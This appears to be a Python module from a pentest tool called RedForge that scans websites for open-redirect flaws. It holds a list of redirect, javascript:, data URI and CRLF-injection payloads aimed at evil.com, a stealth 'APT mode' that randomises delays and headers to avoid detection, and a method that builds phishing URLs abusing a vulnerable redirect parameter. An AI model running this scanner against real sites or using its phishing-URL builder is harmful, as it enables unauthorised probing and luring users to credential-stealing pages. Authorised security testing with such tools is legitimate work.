#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de détection d'Open Redirect pour RedForge
Détecte les vulnérabilités de redirection ouverte
Version avec support furtif, APT et détection avancée
"""

import re
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

from src.core.stealth_engine import StealthEngine


class OpenRedirectScanner:
    """Scanner avancé de redirections ouvertes avec support furtif"""
    
    def __init__(self):
        # Payloads de redirection
        self.redirect_payloads = [
            # External domains
            "https://evil.com",
            "http://evil.com",
            "//evil.com",
            "https://evil.com/@example.com",
            "https://evil.com%23example.com",
            "https://evil.com%2F%2Fexample.com",
            "https://evil.com?example.com",
            "https://evil.com/example.com",
            # Protocol relative
            "//google.com",
            "///google.com",
            "\\\\google.com",
            # URL encoding
            "https%3A%2F%2Fevil.com",
            "https%3A//evil.com",
            "%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%63%6F%6D",
            # Path traversal
            "/https://evil.com",
            "\\https://evil.com",
            "/../https://evil.com",
            # JavaScript pseudo-protocol
            "javascript:alert('XSS')",
            "javascript:window.location='https://evil.com'",
            "javascript:document.location='https://evil.com'",
            "javascript:location.href='https://evil.com'",
            # Data URI
            "data:text/html,<script>alert('XSS')</script>",
            # Open redirect bypasses
            "https://example.com@evil.com",
            "https://evil.com?example.com",
            "https://evil.com/example.com",
            "evil.com",
            "evil.com/example.com",
            "https://evil.com%00@example.com",
            "https://evil.com#@example.com",
            # CRLF injection
            "%0d%0aLocation: https://evil.com",
            "%0d%0a%0d%0a<script>alert('XSS')</script>",
            # Open redirect via parameters
            "//evil.com?redir=example.com",
            "https://evil.com/redirect?url=example.com"
        ]
        
        # Headers indiquant une redirection
        self.redirect_status_codes = [301, 302, 303, 307, 308]
        
        # Moteur de furtivité
        self.stealth_engine = StealthEngine()
        self.stealth_mode = False
        self.apt_mode = False
    
    def set_stealth_config(self, config: Dict[str, Any]):
        """
        Configure le mode furtif
        
        Args:
            config: Configuration de furtivité
        """
        self.stealth_mode = config.get('enabled', False)
        self.apt_mode = config.get('apt_mode', False)
        
        if self.stealth_mode:
            self.stealth_engine.set_delays(
                min_delay=config.get('delay_min', 1),
                max_delay=config.get('delay_max', 5),
                jitter=config.get('jitter', 0.3)
            )
            if self.apt_mode:
                self.stealth_engine.enable_apt_mode()
    
    def _apply_stealth_delay(self):
        """Applique un délai furtif"""
        if self.stealth_mode:
            self.stealth_engine.apply_delay()
    
    def _get_headers(self) -> Dict[str, str]:
        """Génère des headers furtifs"""
        if self.stealth_mode:
            return self.stealth_engine.get_headers()
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'open redirect
        
        Args:
            target: URL cible
            **kwargs:
                - params: Paramètres spécifiques à tester
                - follow_redirects: Suivre les redirections
                - depth: Profondeur de test
        """
        print(f"  → Scan des redirections ouvertes")
        if self.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        vulnerabilities = []
        tested_params = set()
        
        # Identifier les paramètres à tester
        params_to_test = self._get_params_to_test(target, kwargs)
        follow_redirects = kwargs.get('follow_redirects', False)
        
        # Limiter les payloads en mode APT
        payloads = self.redirect_payloads[:30] if self.apt_mode else self.redirect_payloads
        
        for param in params_to_test:
            if param in tested_params:
                continue
            tested_params.add(param)
            
            for payload in payloads:
                self._apply_stealth_delay()
                result = self._test_redirect(target, param, payload, follow_redirects)
                
                if result['vulnerable']:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                        "redirect_url": result['redirect_url'],
                        "status_code": result['status_code'],
                        "severity": "MEDIUM",
                        "type": result.get('type', 'open_redirect'),
                        "risk_score": 70 if result.get('type') == 'external_domain' else 65,
                        "redirect_chain": result.get('redirect_chain', [])
                    })
                    print(f"      ✓ Open redirect trouvée: {param} -> {payload[:40]}...")
                    break
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_redirect_params(target)
        
        # Limiter en mode APT
        if self.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_redirect_params(self, target: str) -> List[str]:
        """Extrait les paramètres potentiels de redirection"""
        redirect_params = [
            'redirect', 'redirect_to', 'redirect_uri', 'return', 'return_to',
            'next', 'forward', 'goto', 'url', 'link', 'dest', 'destination',
            'out', 'view', 'page', 'callback', 'continue', 'return_path',
            'fallback', 'uri', 'path', 'folder', 'load', 'file', 'document',
            'redir', 'redirect_url', 'return_url', 'next_page', 'forward_url'
        ]
        
        # Extraire les paramètres existants
        parsed = urlparse(target)
        if parsed.query:
            existing_params = parse_qs(parsed.query).keys()
            # Prioriser les paramètres qui ressemblent à des redirections
            for param in existing_params:
                if param.lower() in redirect_params:
                    return [param]
        
        return redirect_params
    
    def _test_redirect(self, target: str, param: str, payload: str, 
                       follow_redirects: bool) -> Dict[str, Any]:
        """Teste un payload de redirection"""
        result = {
            'vulnerable': False,
            'redirect_url': None,
            'status_code': None,
            'type': None,
            'redirect_chain': []
        }
        
        # Construire l'URL avec payload
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        # Encoder le payload
        test_payload = quote(payload, safe=':/?&=')
        
        if param in query_params:
            query_params[param] = [test_payload]
        else:
            query_params[param] = [test_payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_headers()
            response = requests.get(test_url, headers=headers, timeout=10, verify=False, 
                                   allow_redirects=follow_redirects)
            
            result['status_code'] = response.status_code
            result['redirect_chain'] = [r.url for r in response.history] if response.history else []
            
            # Vérifier si c'est une redirection HTTP
            if response.status_code in self.redirect_status_codes:
                location = response.headers.get('Location', '')
                if location:
                    result['redirect_url'] = location
                    result = self._analyze_redirect(location, target, result)
            
            # Vérifier les redirections JavaScript
            if not result['vulnerable']:
                result = self._check_javascript_redirect(response.text, target, result)
            
            # Vérifier les redirections meta refresh
            if not result['vulnerable']:
                result = self._check_meta_refresh(response.text, target, result)
            
            # Vérifier les redirections via header Refresh
            if not result['vulnerable']:
                refresh = response.headers.get('Refresh', '')
                if refresh:
                    match = re.search(r'url=(.+?)(?:;|$)', refresh, re.IGNORECASE)
                    if match:
                        result['redirect_url'] = match.group(1)
                        result = self._analyze_redirect(match.group(1), target, result)
                        
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass
        
        return result
    
    def _analyze_redirect(self, redirect_url: str, target: str, 
                          result: Dict) -> Dict:
        """Analyse une URL de redirection"""
        parsed_redirect = urlparse(redirect_url)
        parsed_target = urlparse(target)
        
        # Redirection vers domaine externe
        if parsed_redirect.netloc and parsed_redirect.netloc != parsed_target.netloc:
            result['vulnerable'] = True
            result['type'] = 'external_domain'
        # Protocole javascript
        elif redirect_url.lower().startswith('javascript:'):
            result['vulnerable'] = True
            result['type'] = 'javascript_pseudo'
        # Data URI
        elif redirect_url.lower().startswith('data:'):
            result['vulnerable'] = True
            result['type'] = 'data_uri'
        # Protocole non standard
        elif any(redirect_url.lower().startswith(p) for p in ['vbscript:', 'livescript:', 'mocha:']):
            result['vulnerable'] = True
            result['type'] = 'dangerous_protocol'
        
        return result
    
    def _check_javascript_redirect(self, html: str, target: str, 
                                    result: Dict) -> Dict:
        """Vérifie les redirections JavaScript"""
        js_patterns = [
            (r'window\.location\s*=\s*["\']([^"\']+)["\']', 'window.location'),
            (r'window\.location\.href\s*=\s*["\']([^"\']+)["\']', 'window.location.href'),
            (r'document\.location\s*=\s*["\']([^"\']+)["\']', 'document.location'),
            (r'location\.replace\(["\']([^"\']+)["\']\)', 'location.replace'),
            (r'location\.href\s*=\s*["\']([^"\']+)["\']', 'location.href'),
            (r'self\.location\s*=\s*["\']([^"\']+)["\']', 'self.location'),
            (r'top\.location\s*=\s*["\']([^"\']+)["\']', 'top.location'),
            (r'parent\.location\s*=\s*["\']([^"\']+)["\']', 'parent.location')
        ]
        
        for pattern, source in js_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                redirect_url = match.group(1)
                result['redirect_url'] = redirect_url
                result = self._analyze_redirect(redirect_url, target, result)
                if result['vulnerable']:
                    result['type'] = f'javascript_{result["type"]}'
                    break
        
        return result
    
    def _check_meta_refresh(self, html: str, target: str, 
                            result: Dict) -> Dict:
        """Vérifie les redirections meta refresh"""
        meta_pattern = r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\'][^;]+;url=([^"\']+)["\']'
        match = re.search(meta_pattern, html, re.IGNORECASE)
        if match:
            redirect_url = match.group(1)
            result['redirect_url'] = redirect_url
            result = self._analyze_redirect(redirect_url, target, result)
            if result['vulnerable']:
                result['type'] = f'meta_refresh_{result["type"]}'
        
        return result
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune redirection ouverte détectée"}
        
        return {
            "total": len(vulnerabilities),
            "external_domain": len([v for v in vulnerabilities if 'external_domain' in v.get('type', '')]),
            "javascript_redirect": len([v for v in vulnerabilities if 'javascript' in v.get('type', '')]),
            "meta_refresh": len([v for v in vulnerabilities if 'meta_refresh' in v.get('type', '')]),
            "dangerous_protocol": len([v for v in vulnerabilities if v.get('type') == 'dangerous_protocol']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def generate_redirect_chain(self, target: str, param: str, 
                                final_url: str, length: int = 3) -> List[str]:
        """
        Génère une chaîne de redirections
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            final_url: URL finale de destination
            length: Longueur de la chaîne
        """
        chain = [target]
        current_url = target
        
        for i in range(min(length, 5)):
            parsed = urlparse(current_url)
            query_params = parse_qs(parsed.query)
            query_params[param] = [final_url if i == length - 1 else f"https://evil.com/redirect{i}"]
            new_query = urlencode(query_params, doseq=True)
            current_url = urlunparse(parsed._replace(query=new_query))
            chain.append(current_url)
        
        return chain
    
    def get_phishing_url(self, target: str, param: str, 
                         phishing_domain: str) -> str:
        """
        Génère une URL de phishing exploitant l'open redirect
        
        Args:
            target: URL cible vulnérable
            param: Paramètre vulnérable
            phishing_domain: Domaine de phishing
        """
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        query_params[param] = [f"https://{phishing_domain}/login"]
        new_query = urlencode(query_params, doseq=True)
        
        return urlunparse(parsed._replace(query=new_query))
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques du scanner"""
        return {
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "payloads_count": len(self.redirect_payloads)
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    print("=" * 60)
    print("Test de OpenRedirectScanner")
    print("=" * 60)
    
    scanner = OpenRedirectScanner()
    
    # Configuration mode APT
    scanner.set_stealth_config({
        'enabled': True,
        'apt_mode': True,
        'delay_min': 2,
        'delay_max': 5
    })
    
    # Test (simulé)
    # results = scanner.scan("https://example.com/redirect?url=example.com")
    # print(f"Redirections ouvertes: {results['count']}")
    
    print("\n✅ Module OpenRedirectScanner chargé avec succès")